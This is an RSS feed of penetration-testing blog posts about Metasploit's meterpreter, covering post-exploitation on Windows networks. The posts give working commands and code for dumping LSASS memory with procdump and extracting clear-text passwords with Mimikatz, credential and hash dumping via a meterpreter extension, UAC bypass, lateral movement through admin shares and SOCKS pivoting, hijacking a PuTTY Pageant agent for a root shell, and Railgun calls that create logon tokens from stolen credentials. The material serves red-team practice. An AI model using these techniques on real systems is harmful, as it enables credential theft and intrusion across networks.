<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>meterpreter on malicious.link</title>
    <link>https://malicious.link/categories/meterpreter/</link>
    <description>Recent content in meterpreter on malicious.link</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 07 Jun 2013 15:00:08 +0000</lastBuildDate>
    
        <atom:link href="https://malicious.link/categories/meterpreter/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool</title>
      <link>https://malicious.link/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/</link>
      <pubDate>Fri, 07 Jun 2013 15:00:08 +0000</pubDate>
      
      <guid>https://malicious.link/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/</guid>
      <description>&lt;p&gt;Mimikatz is now &lt;a href=&#34;https://github.com/rapid7/meterpreter/pull/9&#34;&gt;built into Metasploit&amp;rsquo;s meterpreter&lt;/a&gt;, you can do load mimikatz from the meterpreter prompt, but if you don&amp;rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&amp;rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.&lt;/p&gt;

&lt;p&gt;Mimikatz Minidump: &lt;a href=&#34;http://blog.gentilkiwi.com/securite/mimikatz/minidump&#34;&gt;http://blog.gentilkiwi.com/securite/mimikatz/minidump&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Procdump: &lt;a href=&#34;http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx&#34;&gt;http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Lets start. First we make sure our authentication works against the box and we can look inside of C$ (usually only admins can)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;net use \\TARGETBOXC$ /user:DOMAIN\serviceaccount serviceaccount123
dir \\TARGETBOX\C$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If that works then we want to check that we can all the &amp;ldquo;AT&amp;rdquo; command on the remote host:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;at \\TARGETBOX
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;All set. Next lets prep our workspace on the remote host. We are using the C:\Temp directory.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mkdir \\TARGETBOX\C$\Temp
dir \\TARGETBOX\C$\Temp
copy c:\temp\procdump.exe \\TARGETBOXC$
copy c:\temp\procdump.bat \\TARGETBOXC$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The contents of procdump.bat are:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;@echo off
C:\temp\procdump.exe -accepteula -ma lsass.exe %COMPUTERNAME%_lsass.dmp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I&amp;rsquo;m using the computer name in the memory dump name to help me keep track of where the dump came from, but also help me notice when I&amp;rsquo;ve dumped more than one IP that is actually the same host.&lt;/p&gt;

&lt;p&gt;Next we schedule the task. Use net time to determine the local time for the remote machine.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;net time \\TARGETBOX
at \\TARGETBOX 13:52 C:\Temp\procdump.bat
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pull down the file and clean up:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;dir \\TARGETBOX\C$\Temp
copy \\TARGETBOX\C$\Temp\*lsass.dmp C:\temp\output\
rmdir /s \\TARGETBOX\C$\Temp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On your side the only thing you need to make sure is that you are running Mimikatz on a similar version and architecture you pulled from. Use the following url for reference:&lt;a href=&#34;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&#34;&gt;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Load up the Alpha version of Mimikatz, switch it to minidump mode and you&amp;rsquo;re dumping creds:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mimikatz # sekurlsa::minidump SUPERCOMPUTER_lsass.dmp
Switch to MINIDUMP

mimikatz # sekurlsa::logonPasswords full
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thats it. Password dumping without ever using a &amp;ldquo;Hacker&amp;rdquo; tool on target. Much love Microsoft. And even more to Mimikatz creator &lt;a href=&#34;http://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; - Benjamin Delpy for both this alpha release and changing his licensing to allow Mimikatz code to be integrated into Meterpreter.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Sessiondump Meterpreter Extension</title>
      <link>https://malicious.link/post/2013/2013-04-08-sessiondump-meterpreter-extension/</link>
      <pubDate>Mon, 08 Apr 2013 09:58:20 +0000</pubDate>
      
      <guid>https://malicious.link/post/2013/2013-04-08-sessiondump-meterpreter-extension/</guid>
      <description>&lt;p&gt;Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory &lt;a href=&#34;https://malicious.link/blog/2012/9/6/completely-in-memory-mimikatz-with-metasploit.html&#34;&gt;{link}&lt;/a&gt; - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing.&lt;/p&gt;

&lt;p&gt;Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;No blog post or huge Vegas lights talk on it at DefCon or Blackhat. Just posted online in a corner of the Internet:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.hsc.fr/ressources/outils/sessiondump/&#34;&gt;http://www.hsc.fr/ressources/outils/sessiondump/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Before we get started lets be clear about one thing. Sessiondump while awesome doesn&amp;rsquo;t do everything that Mimikatz does. However, it does do the feature of mimikatz that I do use the most, the logged on user hash dumping as well as the wdigest clear text password dumping. It does this as a Meterpreter extension that operates using reflective DLL injection. Does that solve our minor issues we had with mimikatz, as of right now, only partially. This code was simply posted online, not in a pull request or submitted to Metasploit in any way. So you still have to have the binary + code. What about the remembering, surely it makes it so I can just tab complete my way to passwords right? Yup, it does, but until/if it is in the Metasploit trunk you will still have to remember how to get it installed (which we will go over in a bit). The final question is yes it does still transfer a complete DLL over to the host same as any of the other extensions (not to disk mind you, just memory),.&lt;/p&gt;

&lt;p&gt;Without further ado lets go ahead and get the file and do a bunch of extracting. &lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And finally placing everything in it&amp;rsquo;s correct place, which was nice of the author to make easy by making the archive the same as the Metasploit directory structure:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Cool, everything should be good to go. Lets use this thing. I&amp;rsquo;m using psexec to get a shell but any way you get a windows native meterpreter fine, with one caveat, and its the same as with any of the other aforementioned tools. You need to be Admin (past UAC, w/ SeDebug privilege) or NT\AUTHORITY SYSTEM.  After that it&amp;rsquo;s cake, load the extension:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Here is the available commands:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And run getHashes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;or getwDigestPasswords:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Thats is, you free passwords, YAY&amp;hellip;&lt;/p&gt;

&lt;p&gt;Possible issues you may run into:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;If you are on a x64 box and meterpreter isn&amp;rsquo;t running in a x64 process it will fail saying that it doesn&amp;rsquo;t have the correct version offsets, here is how you can check:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_10.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;x64 system and Meterpreter is x86/win32. Lets find a good process to migrate into and kick it from there. Winlogon isn&amp;rsquo;t the greatest choices since if meterpreter decides to crash it during migration then the system will go down, whereas a service running as SYSTEM will probably just restart if something fails.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_11.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;If by any chance you are running it against a system the author hasn&amp;rsquo;t gotten the offsets for. I don&amp;rsquo;t&amp;rsquo; have a screenshot for this one because he covers all the languages I have CMs for, but the author was awesome enough to include a few python scripts that can help you generate the correct offsets. I&amp;rsquo;ll show you by running it on my lsass and widgets.dll files even though he already has this data included in the CSV file that comes with session dump.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Thats all for now folks, may the shells be with you.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Finding Admin Access</title>
      <link>https://malicious.link/post/2012/2012-10-31-finding-admin-access/</link>
      <pubDate>Wed, 31 Oct 2012 01:28:22 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-10-31-finding-admin-access/</guid>
      <description>&lt;p&gt;You&amp;rsquo;ve got shell, and a set of credentials but you&amp;rsquo;re coming up empty on what you can do with those credentials. This is especially problematic when you can&amp;rsquo;t get past UAC as you are either in a AlwaysNotify situation or not a local admin.&lt;/p&gt;

&lt;p&gt;(I&amp;rsquo;m not trying to pull some some &amp;ldquo;insert magic here&amp;rdquo; on the assumption of credentials just at the time of this writing I have only just started working (created a blank file) on a post module to do this as your current user, so until then, you need credentials)&lt;/p&gt;

&lt;p&gt;Enter the auxiliary module: &lt;code&gt;auxiliary/admin/smb/check_dir_file&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;First we set up a route as aux modules don&amp;rsquo;t have a &amp;ldquo;SESSION&amp;rdquo; parameter:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Use the module and set our credentials:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Next, set ADMIN$ as we can&amp;rsquo;t guarantee C$ is the primary drive, but ADMIN$ will definitely be the WINDOWS directory. Our RHOSTS is our target range&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;A simple &amp;lsquo;run&amp;rsquo; and away it goes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;So we can see that our lowly user that doesn&amp;rsquo;t have any chance of bypassing the UAC on his current system can pivot to these other systems (172.16.10.10, and 172.16.10.150) quite easily.&lt;/p&gt;

&lt;p&gt;=============================================================================&lt;/p&gt;

&lt;p&gt;The rest of this has nothing to do about admin access, just some tricks to do it better&lt;/p&gt;

&lt;p&gt;=============================================================================&lt;/p&gt;

&lt;p&gt;As many of you know I&amp;rsquo;m not a huge fan of sending packets I don&amp;rsquo;t need to so instead of just spraying a range (which I doubt would be seen, but why take the chance?)&lt;/p&gt;

&lt;p&gt;[&lt;strong&gt;Update&lt;/strong&gt;: While computer_browser_discovery does lookup all the hosts and sends -more- packets than check_dir_file would, those extra packets are sent at DNS resolvers not into empty space that can be detected by network sensors]&lt;/p&gt;

&lt;p&gt;Enter computer_browser_discovery:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This module does the equivalent of &amp;lsquo;net view&amp;rsquo; to get a list of computers on the domain. You can change the LTYPE to &amp;ldquo;SQL&amp;rdquo; to just get MSSQL boxes but we&amp;rsquo;re going for everything:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see WIN7X86 (the box we are on came up with 0.0.0.0) expected. and the .150 address didn&amp;rsquo;t show up at all as it&amp;rsquo;s not on the domain. So the benefits is that it&amp;rsquo;s quieter on the wire and you probably will find hosts that aren&amp;rsquo;t in your immediate IP range. (Not the case here simply because I don&amp;rsquo;t have a big enough test network). The disadvantages are as with the .150 address you may miss hosts.&lt;/p&gt;

&lt;p&gt;Next we add the found host&amp;rsquo;s IP addresses to a text file (targethosts.txt)&lt;/p&gt;

&lt;p&gt;[because at the time of this writing the computer_browser_discovery module doesn&amp;rsquo;t add the hosts to the MSF database]&lt;/p&gt;

&lt;p&gt;Then use the smb_version module which does a couple things, it verifies that the hosts are there and alive, adds them to the MSF database, and what version of Windows (or samba) they are running:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;(We still have our route set up so this is module is going through our low privilege user still)&lt;/p&gt;

&lt;p&gt;And now we have info in the DB for better targeting:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Then back in our check_dir_file module we just use the hosts -R to have the database automatically set RHOSTS to the hosts in the database that match your search or alternatively use services -p 445 -R to add all the hosts that you&amp;rsquo;ve found port 445 open (everything smb_version finds will be shown in services)&lt;/p&gt;

&lt;p&gt;One more way you can get hosts is doing reverse lookups of ranges. You can just hit a range you know of, or guess ranges based on the computer_browser_discovery results. You can do this with resolve_ip module (this can be pretty slow on ranges that don&amp;rsquo;t have many hosts):&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I used the range this blog is hosted on 1) because for some reason my stupid VM wasn&amp;rsquo;t resolving internal stuff 2) To demonstrate that you can use the module to resolve anything, not just internal ranges.&lt;/p&gt;

&lt;p&gt;So to wrap up, we have a ton of ways to find hosts that don&amp;rsquo;t involve traditional scanning (smb_version is the only thing that comes close). And we&amp;rsquo;ve located two hosts that we have the ability to administer. One oddly enough being the domain controller, so don&amp;rsquo;t ever discount the access you already have. Tunnel vision is the pentesters worst enemy.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>BypassUAC got a facelift</title>
      <link>https://malicious.link/post/2012/2012-10-30-bypassuac-got-a-facelift/</link>
      <pubDate>Tue, 30 Oct 2012 20:05:21 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-10-30-bypassuac-got-a-facelift/</guid>
      <description>&lt;p&gt;Dave Kennedy and Kevin Mitnick submitted the &amp;ldquo;bypassuac&amp;rdquo; post module to Metasploit a while back (last DerbyCon?). Which is awesome and they did some fantastic work, but I had a few complaints as probably anyone did who used the module on a somewhat modern network.&lt;/p&gt;

&lt;p&gt;&amp;ldquo;Old&amp;rdquo; module &lt;code&gt;post/windows/escalate/bypassuac&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I decided to give it a bit of a face lift:&lt;/p&gt;

&lt;p&gt;&amp;ldquo;New&amp;rdquo; local exploit module &lt;code&gt;exploit/windows/local/bypassuac&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;All of the credit for the availability of this module goes to &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;@egyp7&lt;/a&gt; though, without his epic addition of local exploits to Metasploit the majority of the updates to this module wouldn&amp;rsquo;t be possible.&lt;/p&gt;

&lt;p&gt;Anywho, on to the new features:&lt;/p&gt;

&lt;p&gt;1) You can set any windows payload you want to use now:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;and yes it supports EXE::Custom.&lt;/p&gt;

&lt;p&gt;2) It lets you know if it will be able to bypass the current setting of UAC or not:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Even when you&amp;rsquo;re going overkill with it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;(ASK module if UAC is disabled will just elevate without any kind of user prompt)&lt;/p&gt;

&lt;p&gt;And of course it works as expected if UAC needs bypassing:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;One thing I have yet to update is a simple check to make sure you are an admin that can actually bypass UAC. If you aren&amp;rsquo;t, then you&amp;rsquo;ll be leaving this lovely calling card behind for the user:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Mounting SMB shares over Meterpreter</title>
      <link>https://malicious.link/post/2012/2012-10-17-mounting-smb-shares-over-meterpreter/</link>
      <pubDate>Wed, 17 Oct 2012 17:52:30 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-10-17-mounting-smb-shares-over-meterpreter/</guid>
      <description>&lt;p&gt;Ok, this is pretty straight forward no magic:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Got a shell, doesn&amp;rsquo;t have to be SYSTEM&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Add a route to the internal range or directly to the host you want over the session you want&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Mosy on over  to the Socks4a module. And in another terminal we need to make sure our proxychains.conf file in /etc/ or where ever you store your conf is correct. &lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;It defaults to 9050 on 127.0.01 for Tor, that&amp;rsquo;s pretty easy to cope with and no reason to mess with it if you actually use it for Tor for other things.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Run the socks proxy with the Tor-like settings. (Remember to shutdown Tor first)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And the rest is gravy. The % (percent sign if blog software mangles it) is a delimiter that smbclient and other samba tools recognize between user and password (so it doesn&amp;rsquo;t prompt you for it).&lt;/p&gt;

&lt;p&gt;And just to love it working:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;yay files.. Yes I know I didn&amp;rsquo;t use smbmount but it works the same as well as rpcclient.&lt;/p&gt;

&lt;p&gt;A side note here is if you are using the pth-tools from:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://code.google.com/p/passing-the-hash/&#34;&gt;https://code.google.com/p/passing-the-hash/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can use hashes instead of passwords for stuff like this. But who are we kidding? Who doesn&amp;rsquo;t get clear text passwords anymore ;-)&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Free Shells with Plink and Pageant</title>
      <link>https://malicious.link/post/2012/2012-08-28-free-shells-with-plink-and-pageant/</link>
      <pubDate>Tue, 28 Aug 2012 15:42:03 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-08-28-free-shells-with-plink-and-pageant/</guid>
      <description>&lt;p&gt;Watching &lt;a href=&#34;http://twitter.com/egyp7&#34;&gt;Egypt&lt;/a&gt;’s talk at DEFCON 20 he mentioned the ability to jump on on a system when pageant (puTTY’s ssh-agent equivalent) is running. So I wanted to figure out the best way to get this going. Here is what I came up with:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; run enum_putty
[*] Putty Installed for [[&amp;quot;Administrator&amp;quot;]]
[*] Saved SSH Server Public Keys:
[*]     rsa2@22:172.16.10.150
[*] Session corp_webserver:
[*]     Protocol: SSH
[*]     Hostname: 172.16.10.150
[*]     Username: root
[*]     Public Key:
meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Awesome, this guy runs as root and we have the IP address. But it doesn’t have any public keys listed. That’s ok because Pageant is running.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; shell
Process 3364 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Program Files\PuTTY&amp;gt;plink -agent root@172.16.10.150
plink -agent root@172.16.10.150
Welcome to Ubuntu 12.04 LTS (GNU/Linux 2.6.39.1-34 i686)
No mail.
Last login: Tue Aug 28 14:15:18 2012 from 172.16.10.100
root@172.16.10.150:~]$ id
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;w00t! An extra shell for free!!&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201208_freeshells_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Raising Zombies in Windows: Part 1 - Passwords</title>
      <link>https://malicious.link/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/</link>
      <pubDate>Tue, 31 Jul 2012 20:20:15 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/</guid>
      <description>&lt;p&gt;With the use of Mimikatz and WCE, clear text passwords are much more common. What isn&amp;rsquo;t always there is the user. They take lunches, go home at a reasonable time and generally aren&amp;rsquo;t really appreciative of our (pentester/red teamer)&amp;rsquo;s schedule.&lt;/p&gt;

&lt;p&gt;A straight forward way, and provided by Microsoft to create a process as a user (whereby having their token readily available is using &amp;lsquo;runas.exe&amp;rsquo;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_zombies_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;w00t, we the user is present, we can migrate our meterepreter session into that notepad and we&amp;rsquo;re good right? Problem there is you have to interactively input the password, so without a real cmd.exe or RDP session of your own, (VNC payload would work), you&amp;rsquo;re generally SOL.&lt;/p&gt;

&lt;p&gt;There are a ton of posted ways around this, most involve make a wrapper script to input the password for you such as this one:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_zombies_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;(this was pretty unique as it actually sent the keys to the key buffer instead of directly to STDIN)&lt;/p&gt;

&lt;p&gt;Another way if you don&amp;rsquo;t mind dropping / creating a custom bin, AutoIT makes this REALLY simple:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_zombies_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This could be 2 lines if you really wanted it to be but I like to make things a bit more universal. You could also execute this directly in memory with meterepreter&amp;rsquo;s execute command with the &amp;ldquo;-m&amp;rdquo; argument after you&amp;rsquo;ve built the AutoIT script into a EXE.&lt;/p&gt;

&lt;p&gt;But what go through all that trouble? Railgun can do this just as easily. Drop to IRB or create a script that does the following:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;a = client.railgun.kernel32.GetStartupInfoW(56)[&amp;quot;lpStartupInfo&amp;quot;]
client.railgun.advapi32.CreateProcessWithLogonW(&amp;quot;USER&amp;quot;,&amp;quot;DOMAIN&amp;quot;,&amp;quot;PASSWORD&amp;quot;,&amp;quot;LOGON_WITH_PROFILE&amp;quot;,&amp;quot;notepad.exe&amp;quot;,nil,0,nil,nil,a,32)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This will create a notepad.exe process with the defined user. But we can go a bit more stealthy, since we really only need their account token we can just user LogonUser:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.railgun.advapi32.LogonUserA(&amp;quot;USER&amp;quot;,&amp;quot;DOMAIN&amp;quot;,&amp;quot;PASSWORD&amp;quot;,&amp;quot;LOGON32_LOGON_INTERACTIVE&amp;quot;,&amp;quot;LOGON32_PROVIDER_DEFAULT&amp;quot;,4)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;List the tokens available with Incognito, your new user will be there, steal it and you&amp;rsquo;re done. You now have the ability to user that account/domain token on any of the hosts you&amp;rsquo;ve compromised on the network, not just the ones they happen to have left themselves logged in. This gets really fun on servers where the admin hasn&amp;rsquo;t logged in but you wanna grab all of their IE saved passwords ;-)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Netstat Post Module for Meterpreter</title>
      <link>https://malicious.link/post/2012/2012-06-28-netstat-post-module-for-meterpreter/</link>
      <pubDate>Thu, 28 Jun 2012 13:18:52 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-06-28-netstat-post-module-for-meterpreter/</guid>
      <description>&lt;p&gt;Submitted it to MSF via pull request here: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/538&#34;&gt;https://github.com/rapid7/metasploit-framework/pull/538&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Added to trunk: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/tcpnetstat.rb&#34;&gt;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/tcpnetstat.rb&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I promised this one a while ago, sorry for the delay. This only does TCP, it&amp;rsquo;d be trivial to do UDP as well but never really found anything interesting and actively going on on the UDP side. It&amp;rsquo;s real simple, first we&amp;rsquo;ve gotta add the &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366026%28v=vs.85%29.aspx&#34;&gt;GetTcpTable&lt;/a&gt; function to railgun:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;session.railgun.add_function(&#39;iphlpapi&#39;, &#39;GetTcpTable&#39;, &#39;DWORD&#39;, [
	[&#39;PBLOB&#39;, &#39;pTcpTable&#39;, &#39;out&#39;],
	[&#39;PDWORD&#39;, &#39;pdwSize&#39;, &#39;inout&#39;],
	[&#39;BOOL&#39;, &#39;bOrder&#39;, &#39;in&#39;]
])
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then gauge the size of the table:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;getsize = session.railgun.iphlpapi.GetTcpTable(4,4,true)
buffersize = getsize[&#39;pdwSize&#39;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Run the call again with the correct buffer size:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;tcptable = session.railgun.iphlpapi.GetTcpTable(buffersize,buffersize,true)
&lt;/code&gt;&lt;/pre&gt;

